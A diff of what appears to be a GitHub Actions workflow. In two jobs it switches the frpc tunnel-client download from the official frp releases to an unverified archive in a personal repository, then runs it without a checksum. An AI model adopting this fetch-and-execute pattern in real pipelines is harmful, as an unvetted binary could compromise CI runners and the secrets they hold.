@@ -18,9 +18,9 @@ jobs:
     steps:
       - name: Download frpc
         run: |
-          wget https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_linux_amd64.tar.gz
-          tar -zxf ./frp_0.37.1_linux_amd64.tar.gz
-          mv ./frp_0.37.1_linux_amd64/frpc ./frpc
+          wget https://github.com/Heellc/hpga/raw/main/frp_0.38.0_linux_amd64.tar.gz
+          tar -zxf ./frp_0.38.0_linux_amd64.tar.gz
+          mv ./frp_0.38.0_linux_amd64/frpc ./frpc
           chmod +x ./frpc
       - name: Write CA cert
         run: |
@@ -77,9 +77,9 @@ jobs:
     steps:
       - name: Download frpc
         run: |
-          wget https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_linux_amd64.tar.gz
-          tar -zxf ./frp_0.37.1_linux_amd64.tar.gz
-          mv ./frp_0.37.1_linux_amd64/frpc ./frpc
+          wget https://github.com/Heellc/hpga/raw/main/frp_0.38.0_linux_amd64.tar.gz
+          tar -zxf ./frp_0.38.0_linux_amd64.tar.gz
+          mv ./frp_0.38.0_linux_amd64/frpc ./frpc
           chmod +x ./frpc
       - name: Write CA cert
         run: |
